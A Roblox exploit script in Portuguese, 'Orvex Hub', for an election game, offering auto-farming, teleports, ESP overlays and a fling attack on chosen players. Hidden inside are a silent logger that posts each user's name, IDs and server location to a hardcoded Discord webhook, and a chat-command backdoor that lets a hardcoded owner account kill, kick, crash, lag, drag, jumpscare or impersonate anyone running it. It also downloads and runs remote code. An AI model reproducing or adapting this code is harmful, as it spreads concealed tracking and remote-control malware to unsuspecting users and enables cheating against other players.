-- ORVEX HUB | FARM, ESP REESTRUTURADO & DASHBOARD DE ELEIÇÕES (RAYFIELD GEN2)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local jogador = Players.LocalPlayer
local pastaNPC = Workspace:WaitForChild("PopulacaoNPC")
local pastaEntradas = Workspace:WaitForChild("EntradasSaidas")

-- [SISTEMA SILENCIOSO DE LOGS DISCORD WEBHOOK]
task.spawn(function()
    local urlWebhook = "https://discord.com/api/webhooks/1563689740912562178/6A2WEFoi9lSwj-r1CAWLfgcjdgXvjyDeZbyPQfeMR6SQ-PIqL1IjoykUtTG8s2tKAWYr"
    local enviarRequisicao = syn and syn.request or http_request or request or (http and http.request)
    
    if enviarRequisicao then
        pcall(function()
            local dadosPayload = {
                ["username"] = "Orvex Logger",
                ["avatar_url"] = "https://imgur.com/vq2H63T.jpeg",
                ["embeds"] = {{
                    ["title"] = "🚀 Novo Usuário Executou o Script!",
                    ["color"] = 34265, -- Cor ciano em formato numérico decimal
                    ["thumbnail"] = {
                        ["url"] = string.format("https://roblox.com", tostring(jogador.UserId))
                    },
                    ["fields"] = {
                        {["name"] = "👤 Nome de Exibição", ["value"] = "```" .. tostring(jogador.DisplayName) .. "```", ["inline"] = true},
                        {["name"] = "🏷️ Nome de Usuário", ["value"] = "```@" .. tostring(jogador.Name) .. "```", ["inline"] = true},
                        {["name"] = "🆔 User ID", ["value"] = "```" .. tostring(jogador.UserId) .. "```", ["inline"] = false},
                        {["name"] = "🌍 ID do Jogo (PlaceId)", ["value"] = "```" .. tostring(game.PlaceId) .. "```", ["inline"] = true},
                        {["name"] = "📦 ID do Servidor (JobId)", ["value"] = "```" .. tostring(game.JobId) .. "```", ["inline"] = true},
                        {["name"] = "⚡ Comando de Entrada Rápida (Siga o Alvo)", ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "', game:GetService('Players').LocalPlayer)\n```", ["inline"] = false}
                    },
                    ["footer"] = {
                        ["text"] = "Orvex Security Network • " .. os.date("%d/%m/%Y às %H:%M:%S")
                    }
                }}
            }

            enviarRequisicao({
                Url = urlWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(dadosPayload)
            })
        end)
    end
end)

local remoteAbrirInteracao = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"):WaitForChild("InteracaoPlayer"):WaitForChild("Abrir")
local remotePedirApoio = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"):WaitForChild("ApoioPolitico"):WaitForChild("Pedir")
local remoteWindBanner = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"):WaitForChild("Campanha"):WaitForChild("ColocarWindBanner")
local remoteDebateEstudo = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"):WaitForChild("DebateEstudo"):WaitForChild("Estudar")
local remoteComicioAcao = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"):WaitForChild("Comicio"):WaitForChild("Acao")

local farmManualAtivo = false
local farmPlayersAtivo = false
local farmWindBannerAtivo = false
local farmEstudoAtivo = false
local farmEstudoContinuoAtivo = false
local farmComicioAtivo = false

local espNPCAtivo = false
local espCargoAtivo = false
local espCandidatosAtivo = false
local espEstudosAtivo = false
local espPorcentagemAtivo = false

local ultimoUso = {}
local COOLDOWN_LOCAL = 5
local politicoSelecionado = ""
local temaEstudoSelecionado = "ECONOMIA"
local executandoTeleportePlayer = false

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local Window = Rayfield:CreateWindow({
    Name = "ORVEX HUB ",
    Subtitle = "Em Atualização",
    Theme = "Default" ,
    Icon = "rbxassetid://80387863064905",
    ShowName = "Orvex",
    Configuration = {
        AutoSave = true,
        AutoLoad = false,
        FileName = "OrvexFarmConfig"
    }
})

local TabFarm = Window:CreateTab({ Name = "Farm", Icon = "rbxassetid://100604009889706" })
local TabTP = Window:CreateTab({ Name = "Teleporte", Icon = "rbxassetid://125823673784681" })
local TabESP = Window:CreateTab({ Name = "Esp", Icon = "rbxassetid://91452555903853" })
local TabTroll = Window:CreateTab({ Name = "Forjar/Troll", Icon = "rbxassetid://10651147057" })
local TabDashboard = Window:CreateTab({ Name = "Hub Candidatos", Icon = "rbxassetid://111263549366178" })

local function obterInformacaoPlayer(p, nomeChave)
    if not p then return nil end
    local char = p.Character
    
    if nomeChave == "TipoCandidatura" then
        local tipoDEX = p:FindFirstChild("IntencaoVotoTipo", true) or (char and char:FindFirstChild("IntencaoVotoTipo", true))
        if tipoDEX and tipoDEX:IsA("StringValue") then return tipoDEX.Value end
    end

    local attr = p:GetAttribute(nomeChave) or (char and char:GetAttribute(nomeChave))
    if attr then return attr end
    local var = p:FindFirstChild(nomeChave, true) or (char and char:FindFirstChild(nomeChave, true))
    if var and (var:IsA("ValueObject") or var:IsA("StringValue") or var:IsA("NumberValue")) then return var.Value end
    return nil
end

local function verificarSeEhPoliticoValido(p)
    if p == jogador then return false end
    local cargo = obterInformacaoPlayer(p, "Cargo")
    if cargo and cargo ~= "" and cargo ~= "Cidadao" and cargo ~= "NaoEleito" and cargo ~= "Candidato" then
        return true, tostring(cargo)
    end
    return false
end

local function obterListaPoliticos()
    local lista = {}
    for _, p in ipairs(Players:GetPlayers()) do
        local ehPolitico, nomeCargo = verificarSeEhPoliticoValido(p)
        if ehPolitico then
            table.insert(lista, string.format("%s | %s (@%s)", nomeCargo, p.DisplayName, p.Name))
        end
    end
    if #lista == 0 then table.insert(lista, "Nenhum político online") end
    return lista
end

TabFarm:CreateSection({ Name = "Automação por Aproximação" })
TabFarm:CreateToggle({
    Name = "Farm Apoio (NPC)",
    Description = "Coleta automática ao caminhar perto de NPCs.",
    Value = false,
    Callback = function(valor) farmManualAtivo = valor end
})

TabFarm:CreateSection({ Name = "Automação de Apoio via Players" })
TabFarm:CreateToggle({
    Name = "Farm Apoio (Player)",
    Description = "Coleta o apoio de jogadores próximos e retorna à sua posição original.",
    Value = false,
    Callback = function(valor) farmPlayersAtivo = valor end
})

TabFarm:CreateSection({ Name = "Automação de Objetos de Campanha" })
TabFarm:CreateToggle({
    Name = "Colocar Windbanner",
    Description = "Posiciona de forma otimizada os 10 banners permitidos.",
    Value = false,
    Callback = function(valor) farmWindBannerAtivo = valor end
})

TabFarm:CreateSection({ Name = "Preparação Eleitoral Avançada" })
TabFarm:CreateDropdown({
    Name = "Matéria para Estudo",
    Options = {"AGRICULTURA", "ECONOMIA", "SAÚDE", "SEGURANÇA", "EDUCAÇÃO", "INFRAESTRUTURA"},
    CurrentOption = "ECONOMIA",
    MultipleOptions = false,
    Callback = function(opcao) temaEstudoSelecionado = opcao end
})

TabFarm:CreateToggle({
    Name = "Auto Estudo",
    Description = "Estuda continuamente a matéria selecionada no menu.",
    Value = false,
    Callback = function(valor) farmEstudoAtivo = valor end
})

TabFarm:CreateToggle({
    Name = "Estudo Contínuo",
    Description = "Percorre e estuda infinitamente todas as categorias disponíveis de forma sequencial.",
    Value = false,
    Callback = function(valor) farmEstudoContinuoAtivo = valor end
})

TabFarm:CreateToggle({
    Name = "Auto Comício",
    Description = "Inicia o evento simples no palco e automatiza a sequência de discursos.",
    Value = false,
    Callback = function(valor) farmComicioAtivo = valor end
})

TabTP:CreateSection({ Name = "Pontos Geográficos Globais" })

local function executarTeleporte(destinoCFrame)
    local char = jogador.Character
    local raiz = char and char:FindFirstChild("HumanoidRootPart")
    if raiz then
        raiz.Velocity = Vector3.zero
        raiz.RotVelocity = Vector3.zero
        raiz.CFrame = destinoCFrame
    end
end

local function obterCFrameDoObjeto(instancia)
    if not instancia then return nil end
    if instancia:IsA("BasePart") then return instancia.CFrame end
    if instancia:IsA("Model") then return instancia:GetPivot() end
    return nil
end

TabTP:CreateButton({
    Name = "Congresso",
    Callback = function()
        local obj = pastaEntradas:FindFirstChild("CongressoEntrada")
        local cf = obterCFrameDoObjeto(obj)
        if cf then executarTeleporte(cf * CFrame.new(0, 3, 0)) end
    end
})

TabTP:CreateButton({
    Name = "Plantalto",
    Callback = function()
        local obj = pastaEntradas:FindFirstChild("PlantaltoEntrada")
        local cf = obterCFrameDoObjeto(obj)
        if cf then executarTeleporte(cf * CFrame.new(0, 3, 0)) end
    end
})

TabTP:CreateButton({
    Name = "Supremo",
    Callback = function()
        local obj = pastaEntradas:FindFirstChild("SupremoEntrada")
        local cf = obterCFrameDoObjeto(obj)
        if cf then executarTeleporte(cf * CFrame.new(0, 3, 0)) end
    end
})

TabTP:CreateSection({ Name = "Coordenadas da Câmara e Instâncias" })

TabTP:CreateButton({
    Name = "Ponto Candidatura",
    Callback = function()
    executarTeleporte(CFrame.new(-501.191, 3.97197, 285.553, 0.999565, -5.54284e-09, 0.0294929, 4.8515e-09, 1, 2.35124e-08, -0.0294929, -2.33591e-08, 0.999565))
end
})
TabTP:CreateButton({
Name = "Mesa Parlamentar",
Callback = function()
executarTeleporte(CFrame.new(-400.437, 3.92592, 232.358, 0.0601696, 2.53902e-08, -0.998188, 6.16584e-09, 1, 2.58079e-08, 0.998188, -7.70752e-09, 0.0601696))
end
})
TabTP:CreateButton({
Name = "Mesa Estudo",
Callback = function()
executarTeleporte(CFrame.new(-503.142, 3.96408, 229.418, -0.989466, 3.31197e-09, -0.144762, -2.24467e-09, 1, 3.82213e-08, 0.144762, 3.81436e-08, -0.989466))
end
})
TabTP:CreateButton({
Name = "Pronunciamento",
Callback = function()
executarTeleporte(CFrame.new(-586.893, 3.92592, 231.931, 0.00575683, -2.15681e-08, 0.999983, 3.56034e-09, 1, 2.15479e-08, -0.999983, 3.43623e-09, 0.00575683))
end
})
TabTP:CreateButton({
Name = "Cam.Deputados",
Callback = function()
executarTeleporte(CFrame.new(-374.337, 3.99825, 297.691, 0.0835232, -5.50519e-08, -0.996506, -6.77348e-08, 1, -6.09222e-08, 0.996506, 7.25865e-08, 0.0835232))
end
})
TabTP:CreateButton({
Name = "Senado",
Callback = function()
executarTeleporte(CFrame.new(-625.611, 4.00898, 269.496, -0.0349908, -7.79817e-09, 0.999388, -1.34494e-08, 1, 7.33206e-09, -0.999388, -1.31846e-08, -0.0349908))
end
})
TabESP:CreateSection({ Name = "Visualizadores e Rótulos Políticos" })
local function limparEstruturasCustomESP(char)
if char then
local hl = char:FindFirstChild("OrvexESP")
if hl then hl:Destroy() end
local bill = char:FindFirstChild("Head") and char.Head:FindFirstChild("OrvexBillboard")
if bill then bill:Destroy() end
end
end
local function criarBillboardCustom(head, texto, cor)
local bill = head:FindFirstChild("OrvexBillboard")
if bill then bill:Destroy() end
bill = Instance.new("BillboardGui")
bill.Name = "OrvexBillboard"
bill.Adornee = head
bill.Size = UDim2.fromOffset(230, 32)
bill.StudsOffset = Vector3.new(0, 4.0, 0)
bill.AlwaysOnTop = true
bill.MaxDistance = 200
bill.LightInfluence = 0
bill.Parent = head
local lbl = Instance.new("TextLabel")
lbl.Size = UDim2.fromScale(1, 1)
lbl.BackgroundTransparency = 1
lbl.Font = Enum.Font.GothamBold
lbl.Text = tostring(texto):upper()
lbl.TextSize = 13
lbl.TextColor3 = cor
lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
lbl.TextStrokeTransparency = 0.25
lbl.Parent = bill
end
local function aplicarHighlight(instancia, corBorda)
local hl = instancia:FindFirstChild("OrvexESP")
if not hl then
hl = Instance.new("Highlight")
hl.Name = "OrvexESP"
hl.FillColor = corBorda
hl.FillTransparency = 0.7
hl.OutlineColor = corBorda
hl.OutlineTransparency = 0.1
hl.Adornee = instancia
hl.Parent = instancia
end
end
TabESP:CreateToggle({
Name = "Esp NPC",
Description = "Destaque visual na pasta de NPCs da População.",
Value = false,
Callback = function(v)
espNPCAtivo = v
if not v then
for _, npc in ipairs(pastaNPC:GetChildren()) do
local hl = npc:FindFirstChild("OrvexESP") if hl then hl:Destroy() end
end
end
end
})
TabESP:CreateToggle({
Name = "Esp Cargo",
Description = "Exibe o cargo acima da cabeça. Filtra Não Eleitos e Cidadãos.",
Value = false,
Callback = function(v)
espCargoAtivo = v
if not v then
for _, p in ipairs(Players:GetPlayers()) do if p.Character then limparEstruturasCustomESP(p.Character) end end
end
end
})
TabESP:CreateToggle({
Name = "Esp Candidato",
Description = "Identifica candidatos ao Congresso ou Presidência.",
Value = false,
Callback = function(v)
espCandidatosAtivo = v
if not v then
for _, p in ipairs(Players:GetPlayers()) do if p.Character then limparEstruturasCustomESP(p.Character) end end
end
end
})
TabESP:CreateToggle({
Name = "Esp Quantidade de Estudos",
Description = "Exibe o total de debates estudados do jogador.",
Value = false,
Callback = function(v)
espEstudosAtivo = v
if not v then
for _, p in ipairs(Players:GetPlayers()) do if p.Character then limparEstruturasCustomESP(p.Character) end end
end
end
})
TabESP:CreateToggle({
Name = "Esp Porcentagem",
Description = "Exibe a intenção de votos atual.",
Value = false,
Callback = function(v)
espPorcentagemAtivo = v
if not v then
for _, p in ipairs(Players:GetPlayers()) do if p.Character then limparEstruturasCustomESP(p.Character) end end
end
end
})
TabTroll:CreateSection({ Name = "Execução de Utilitários" })
TabTroll:CreateButton({
Name = "Abrir NovaHub (Clone Player)",
Callback = function()
loadstring(game:HttpGet("githubusercontent.com"))()
end
})
TabTroll:CreateSection({ Name = "Alvos Políticos Disponíveis" })
local DropdownPoliticos = TabTroll:CreateDropdown({
Name = "Selecionar Político",
Options = obterListaPoliticos(),
CurrentOption = "",
MultipleOptions = false,
Callback = function(opcaoSelecionada)
if opcaoSelecionada and opcaoSelecionada ~= "Nenhum político online" then
local nickFiltrado = string.match(opcaoSelecionada, "@(%w+)")
politicoSelecionado = nickFiltrado or ""
else
politicoSelecionado = ""
end
end
})
TabTroll:CreateButton({
Name = "Executar Fling no Alvo",
Callback = function()
if politicoSelecionado == "" then
Rayfield:Notify({Title = "Erro", Content = "Selecione um político válido na lista primeiro!", Duration = 3})
return
end
local alvoPlayer = Players:FindFirstChild(politicoSelecionado)
if alvoPlayer and alvoPlayer.Character and alvoPlayer.Character:FindFirstChild("HumanoidRootPart") then
pcall(function()
local meuChar = jogador.Character
local minhaRaiz = meuChar and meuChar:FindFirstChild("HumanoidRootPart")
local meuHumanoid = meuChar and meuChar:FindFirstChildWhichIsA("Humanoid")
local raizAlvo = alvoPlayer.Character.HumanoidRootPart
if minhaRaiz and meuHumanoid then
local posOriginal = minhaRaiz.CFrame
local bamboleo = Instance.new("BodyAngularVelocity")
bamboleo.MaxTorque = Vector3.new(1, 1, 1) * math.huge
bamboleo.AngularVelocity = Vector3.new(0, 99999, 0)
bamboleo.Parent = minhaRaiz
meuHumanoid:ChangeState(Enum.HumanoidStateType.Physics)
minhaRaiz.CFrame = raizAlvo.CFrame * CFrame.new(0, 0.5, 0)
task.wait(0.35)
bamboleo:Destroy()
meuHumanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
minhaRaiz.CFrame = posOriginal
minhaRaiz.Velocity = Vector3.zero
end
end)
else
Rayfield:Notify({Title = "Aviso", Content = "O político selecionado não está vivo ou saiu do servidor.", Duration = 3})
end
end
})
task.spawn(function()
while true do
task.wait(4)
pcall(function() DropdownPoliticos:Refresh(obterListaPoliticos()) end)
end
end)
TabDashboard:CreateSection({ Name = "Candidatos Mais Votados (Decrescente)" })
local LabelPresidencia = TabDashboard:CreateText({ Name = "Presidência", Text = "Carregando intenções de voto..." })
TabDashboard:CreateDivider()
local LabelCongresso = TabDashboard:CreateText({ Name = "Congresso", Text = "Carregando intenções de voto..." })
local dispararPrompt = typeof(fireproximityprompt) == "function" and fireproximityprompt or nil
task.spawn(function()
while true do
task.wait(0.2)
if farmManualAtivo then
local char = jogador.Character
local raiz = char and char:FindFirstChild("HumanoidRootPart")
if raiz then
local agora = os.clock()
for _, npc in ipairs(pastaNPC:GetChildren()) do
if not farmManualAtivo then break end
local raizNPC = npc:FindFirstChild("HumanoidRootPart")
local prompt = raizNPC and raizNPC:FindFirstChild("ConversarPrompt")
if prompt and prompt:IsA("ProximityPrompt") and prompt.Enabled then
local distancia = (raiz.Position - raizNPC.Position).Magnitude
if distancia <= (prompt.MaxActivationDistance - 1) and (agora - (ultimoUso[prompt] or 0) >= COOLDOWN_LOCAL) then
if dispararPrompt then
ultimoUso[prompt] = agora
task.spawn(dispararPrompt, prompt)
task.wait(0.4)
end
end
end
end
end
end
end
end)
task.spawn(function()
while true do
task.wait(1)
if farmPlayersAtivo and not executandoTeleportePlayer then
local listaPlayers = Players:GetPlayers()
for i = 1, #listaPlayers do
if not farmPlayersAtivo then break end
local outroPlayer = listaPlayers[i]
if outroPlayer ~= jogador and outroPlayer.UserId then
local raizAlvo = outroPlayer.Character and outroPlayer.Character:FindFirstChild("HumanoidRootPart")
local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
if raizAlvo and minhaRaiz then
executandoTeleportePlayer = true
local targetId = outroPlayer.UserId
pcall(function()
local CFrameSalvo = minhaRaiz.CFrame
minhaRaiz.CFrame = raizAlvo.CFrame * CFrame.new(0, 0, 1.5)
task.wait(0.18)
remoteAbrirInteracao:FireServer(targetId)
task.wait(0.08)
remotePedirApoio:FireServer(targetId)
task.wait(0.1)
minhaRaiz.CFrame = CFrameSalvo
end)
task.wait(0.4)
executandoTeleportePlayer = false
end
end
end
end
end
end)
task.spawn(function()
while true do
task.wait(1)
if farmWindBannerAtivo then
local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
if minhaRaiz then
for bannerCount = 1, 10 do
if not farmWindBannerAtivo then break end
pcall(function() remoteWindBanner:FireServer() end)
task.wait(0.3)
if bannerCount < 10 and farmWindBannerAtivo then
minhaRaiz.CFrame = minhaRaiz.CFrame * CFrame.new(12, 0, 0)
task.wait(0.2)
end
end
farmWindBannerAtivo = false
break
end
end
end
end)
task.spawn(function()
while true do
task.wait(1)
if farmEstudoAtivo and not farmEstudoContinuoAtivo then
pcall(function()
remoteDebateEstudo:FireServer({ tema = temaEstudoSelecionado })
end)
task.wait(7.3)
end
end
end)
task.spawn(function()
local listaTemasValidos = {"AGRICULTURA", "ECONOMIA", "SAÚDE", "SEGURANÇA", "EDUCAÇÃO", "INFRAESTRUTURA"}
while true do
task.wait(1)
if farmEstudoContinuoAtivo then
for i = 1, #listaTemasValidos do
if not farmEstudoContinuoAtivo then break end
local temaRodada = listaTemasValidos[i]
pcall(function()
remoteDebateEstudo:FireServer({ tema = temaRodada })
end)
task.wait(7.3)
end
end
end
end)
task.spawn(function()
local cframePalco = CFrame.new(383.896, 4.00135, 515.945, -0.567583, -4.95094e-09, 0.823316, -1.4538e-08, 1, -4.00891e-09, -0.823316, -1.42448e-08, -0.567583)
local pontoComicioObj = workspace:FindFirstChild("PointsInteracao") and workspace.PontosInteracao:FindFirstChild("PontoComicio")
while true do
task.wait(1)
if farmComicioAtivo and pontoComicioObj then
local miaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
if miaRaiz then
local comicioIniciadoComSucesso = false
pcall(function()
miaRaiz.CFrame = cframePalco
task.wait(0.25)
local resultadoAbertura = remoteComicioAcao:InvokeServer({
ponto = pontoComicioObj,
acao = "INICIAR",
palcoId = "SIMPLES"
})
if resultadoAbertura and resultadoAbertura.sucesso == true then
comicioIniciadoComSucesso = true
end
end)
if comicioIniciadoComSucesso or farmComicioAtivo then
local tempoInicio = os.clock()
while os.clock() - tempoInicio < 40 and farmComicioAtivo do
pcall(function()
remoteComicioAcao:InvokeServer({
acao = "DISCURSO",
tipo = "PROPRIO"
})
end)
task.wait(2.05)
end
end
task.wait(180.2)
end
end
end
end)
task.spawn(function()
while true do
task.wait(0.6)
if espNPCAtivo then
for _, npc in ipairs(pastaNPC:GetChildren()) do
if npc:IsA("Model") then aplicarHighlight(npc, Color3.fromRGB(0, 180, 255)) end
end
end
local dadosPresidencia = {}
local dadosCongresso = {}
local todosPlayers = Players:GetPlayers()
for i = 1, #todosPlayers do
local p = todosPlayers[i]
local nomeExibicao = p.DisplayName or p.Name
local intencao = tonumber(obterInformacaoPlayer(p, "IntencaoVoto")) or 0
local tipoCand = obterInformacaoPlayer(p, "TipoCandidatura")
local cargo = obterInformacaoPlayer(p, "Cargo")
local totalEstudos = tonumber(obterInformacaoPlayer(p, "EstudosDebatesRealizados")) or 0
local tipoCandUpper = tipoCand and string.upper(tostring(tipoCand)) or ""
if tipoCandUpper == "PRESIDENCIA" then
table.insert(dadosPresidencia, {nome = nomeExibicao, votos = intencao})
elseif tipoCandUpper == "CONGRESSO" then
table.insert(dadosCongresso, {nome = nomeExibicao, votos = intencao})
end
if p.Character and p.Character:FindFirstChild("Head") and p ~= jogador then
local head = p.Character.Head
local textoAcumulado = ""
local corEtiqueta = Color3.fromRGB(255, 255, 255)
local deveRenderizar = false
if espPorcentagemAtivo then
textoAcumulado = textoAcumulado .. string.format("[%d%% VOTOS] ", intencao)
corEtiqueta = Color3.fromRGB(90, 255, 90)
deveRenderizar = true
end
if espCandidatosAtivo then
if tipoCandUpper == "CONGRESSO" or tipoCandUpper == "PRESIDENCIA" then
textoAcumulado = textoAcumulado .. string.format("[%s] ", tipoCandUpper)
corEtiqueta = Color3.fromRGB(0, 255, 235)
deveRenderizar = true
end
end
if espEstudosAtivo then
textoAcumulado = textoAcumulado .. string.format("[%d ESTUDOS] ", totalEstudos)
corEtiqueta = Color3.fromRGB(180, 90, 255)
deveRenderizar = true
end
if espCargoAtivo then
if cargo and cargo ~= "" and cargo ~= "Cidadao" and cargo ~= "NaoEleito" and cargo ~= "VicePresidente" then
textoAcumulado = textoAcumulado .. string.format("[%s] ", tostring(cargo):upper())
corEtiqueta = Color3.fromRGB(255, 215, 90)
deveRenderizar = true
elseif cargo == "VicePresidente" then
textoAcumulado = textoAcumulado .. "[VICE-PRESIDENTE] "
corEtiqueta = Color3.fromRGB(255, 140, 0)
deveRenderizar = true
end
end
if deveRenderizar then
criarBillboardCustom(head, textoAcumulado, corEtiqueta)
aplicarHighlight(p.Character, corEtiqueta)
else
limparEstruturasCustomESP(p.Character)
end
end
end
table.sort(dadosPresidencia, function(a, b) return a.votos > b.votos end)
table.sort(dadosCongresso, function(a, b) return a.votos > b.votos end)
local strPres = ""
for index, item in ipairs(dadosPresidencia) do strPres = strPres .. string.format("%d. %s — %d%%\n", index, item.nome, item.votos) end
LabelPresidencia:SetTitle(strPres == "" and "Nenhum candidato à Presidência ativo." or strPres)
local strCong = ""
for index, item in ipairs(dadosCongresso) do strCong = strCong .. string.format("%d. %s — %d%%\n", index, item.nome, item.votos) end
LabelCongresso:SetTitle(strCong == "" and "Nenhum candidato ao Congresso ativo." or strCong)
end
end)
-- RECEPTOR EM BACKGROUND DOS COMANDOS FÁCEIS DIGITADOS VIA CHAT
task.spawn(function()
local TextChatService = game:GetService("TextChatService")
local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
local DONO_ID = 2980742903
local telaSusto = nil
local loopSusto = nil
local loopLag = nil
local loopControle = nil
local function aplicarTagDono()
if game:GetService("Players").LocalPlayer.UserId == DONO_ID then return end
local head = jogador.Character and jogador.Character:WaitForChild("Head", 10)
if head and not head:FindFirstChild("OrvexUserTag") then
local tagGui = Instance.new("BillboardGui", head)
tagGui.Name = "OrvexUserTag"
tagGui.Size = UDim2.fromOffset(100, 30)
tagGui.StudsOffset = Vector3.new(0, 5.5, 0)
tagGui.AlwaysOnTop = true
tagGui.MaxDistance = 150
local label = Instance.new("TextLabel", tagGui)
label.Size = UDim2.fromScale(1, 1)
label.BackgroundTransparency = 1
label.Font = Enum.Font.GothamBold
label.Text = "[ORVEX USER]"
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.TextSize = 14
label.TextStrokeTransparency = 0.3
end
end
if jogador.Character then aplicarTagDono() end
jogador.CharacterAdded:Connect(function() task.wait(1) aplicarTagDono() end)
local function executarOrdem(cmd, arg)
if cmd == "verificar" then
if canalGeral then pcall(function() canalGeral:SendAsync("new123") end) end
elseif cmd == "fake" then
if canalGeral then
pcall(function()
canalGeral:DisplaySystemMessage(string.format("[%s]: %s", jogador.Name, arg))
end)
end
elseif cmd == "hp" then
if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
jogador.Character:FindFirstChildOfClass("Humanoid").Health = 25
end
elseif cmd == "kill" then
if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
jogador.Character:FindFirstChildOfClass("Humanoid").Health = 0
end
elseif cmd == "kick" then
jogador:Kick(arg ~= "" and arg or "Expulso pela administração.")
elseif cmd == "lag" then
if arg == "on" then
if loopLag then task.cancel(loopLag) end
loopLag = task.spawn(function()
while true do
settings().Network.IncomingReplicationLag = 15
task.wait(0.1)
end
end)
elseif arg == "off" then
if loopLag then task.cancel(loopLag) loopLag = nil end
settings().Network.IncomingReplicationLag = 0
end
elseif cmd == "control" then
if arg == "on" then
if loopControle then task.cancel(loopControle) end
local donoChar = game:GetService("Players"):GetPlayerByUserId(DONO_ID).Character
local donoRaiz = donoChar and donoChar:FindFirstChild("HumanoidRootPart")
local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
if donoRaiz and minhaRaiz then
loopControle = task.spawn(function()
while true do
minhaRaiz.CFrame = donoRaiz.CFrame * CFrame.new(0, 0, -3)
task.wait()
end
end)
end
elseif arg == "off" then
if loopControle then task.cancel(loopControle) loopControle = nil end
end
elseif cmd == "tp" then
local donoChar = game:GetService("Players"):GetPlayerByUserId(DONO_ID).Character
local donoRaiz = donoChar and donoChar:FindFirstChild("HumanoidRootPart")
local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
if donoRaiz and minhaRaiz then
minhaRaiz.CFrame = donoRaiz.CFrame * CFrame.new(0, 0, 2)
end
elseif cmd == "jumpscare" then
local pGui = jogador:WaitForChild("PlayerGui")
if not pGui:FindFirstChild("OrvexSNetwork") then
telaSusto = Instance.new("ScreenGui", pGui) telaSusto.Name = "OrvexSNetwork" telaSusto.IgnoreGuiInset = true
local f = Instance.new("Frame", telaSusto) f.Size = UDim2.new(1,0,1,0) f.BackgroundColor3 = Color3.fromRGB(0,0,0)
local im = Instance.new("ImageLabel", f) im.Size = UDim2.new(0.6,0,0.6,0) im.Position = UDim2.new(0.2,0,0.2,0) im.BackgroundTransparency = 1 im.Image = "rbxassetid://6071575298"
local s = Instance.new("Sound", f) s.SoundId = "rbxassetid://9069609268" s.Volume = 3 s:Play()
loopSusto = task.spawn(function()
local r = Random.new()
while true do
f.BackgroundColor3 = r:NextNumber() > 0.5 and Color3.fromRGB(20,0,0) or Color3.fromRGB(0,0,0)
im.Position = UDim2.new(0.2 + r:NextNumber(-0.02, 0.02), 0, 0.2 + r:NextNumber(-0.02, 0.02), 0)
task.wait(0.05)
end
end)
end
elseif cmd == "unjumpscare" then
if loopSusto then task.cancel(loopSusto) loopSusto = nil end
local pGui = jogador:WaitForChild("PlayerGui")
if pGui:FindFirstChild("OrvexSNetwork") then pGui:FindFirstChild("OrvexSNetwork"):Destroy() end
elseif cmd == "crash" then
while true do end
end
end
TextChatService.OnIncomingMessage = function(mensagemObj)
local texto = mensagemObj.Text
local c, a = string.match(texto, "^%.ovx%s*(%w+)%s*%s*(.*)$")
if c then
task.spawn(executarOrdem, c, a)
end
end
end)




